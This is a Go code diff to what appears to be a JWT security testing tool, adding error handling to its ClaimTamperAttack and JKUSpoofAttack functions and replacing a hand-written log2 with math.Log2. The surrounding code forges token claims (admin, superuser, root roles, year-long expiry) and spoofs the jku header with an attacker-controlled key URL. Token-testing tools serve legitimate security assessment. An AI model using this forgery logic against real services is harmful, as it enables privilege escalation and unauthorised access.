@@ -15,7 +15,7 @@ import (
 	"errors"
 	"fmt"
 	"hash"
-	"math/big"
+	"math"
 	"strings"
 	"time"
 )
@@ -474,10 +474,16 @@ func (a *Attacker) ClaimTamperAttack(token *Token) ([]*Vulnerability, error) {
 	newClaims.Roles = []string{"admin", "superuser", "root"}
 
 	// Keep original signature (hoping server doesn't verify)
-	headerBytes, _ := json.Marshal(token.Header)
+	headerBytes, err := json.Marshal(token.Header)
+	if err != nil {
+		return nil, fmt.Errorf("marshal header: %w", err)
+	}
 	headerB64 := base64URLEncode(headerBytes)
 
-	claimsBytes, _ := json.Marshal(newClaims)
+	claimsBytes, err := json.Marshal(newClaims)
+	if err != nil {
+		return nil, fmt.Errorf("marshal claims: %w", err)
+	}
 	claimsB64 := base64URLEncode(claimsBytes)
 
 	vulns = append(vulns, &Vulnerability{
@@ -494,7 +500,10 @@ func (a *Attacker) ClaimTamperAttack(token *Token) ([]*Vulnerability, error) {
 	newClaims2.ExpiresAt = time.Now().Add(365 * 24 * time.Hour).Unix()
 	newClaims2.NotBefore = 0
 
-	claimsBytes2, _ := json.Marshal(newClaims2)
+	claimsBytes2, err := json.Marshal(newClaims2)
+	if err != nil {
+		return nil, fmt.Errorf("marshal claims: %w", err)
+	}
 	claimsB64_2 := base64URLEncode(claimsBytes2)
 
 	vulns = append(vulns, &Vulnerability{
@@ -565,9 +574,15 @@ func (a *Attacker) JKUSpoofAttack(token *Token, attackerURL string) ([]*Vulnerab
 
 	// For JKU spoofing, create a header with attacker-controlled JKU
 	// The token is properly signed with the attacker's private key
-	headerBytes, _ := json.Marshal(newHeader)
+	headerBytes, err := json.Marshal(newHeader)
+	if err != nil {
+		return nil, fmt.Errorf("marshal JKU header: %w", err)
+	}
 	headerB64 := base64URLEncode(headerBytes)
-	claimsBytes, _ := json.Marshal(token.Claims)
+	claimsBytes, err := json.Marshal(token.Claims)
+	if err != nil {
+		return nil, fmt.Errorf("marshal JKU claims: %w", err)
+	}
 	claimsB64 := base64URLEncode(claimsBytes)
 
 	// Sign with RSA using PKCS#1 v1.5 signature scheme
@@ -887,20 +902,8 @@ func EstimateSecretEntropy(secret string) float64 {
 }
 
 func log2(x float64) float64 {
-	// Simple log2 approximation
 	if x <= 0 {
 		return 0
 	}
-
-	result := big.NewFloat(x)
-	two := big.NewFloat(2)
-
-	var count float64
-	for result.Cmp(two) >= 0 {
-		result.Quo(result, two)
-		count++
-	}
-
-	f, _ := result.Float64()
-	return count + (f - 1)
+	return math.Log2(x)
 }
